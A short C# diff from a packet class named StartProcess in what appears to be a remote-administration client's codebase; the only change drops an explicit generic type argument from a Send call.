@@ -19,7 +19,7 @@ namespace xClient.Core.Packets.ServerPackets
 
         public void Execute(Client client)
         {
-            client.Send<StartProcess>(this);
+            client.Send(this);
         }
     }
 }
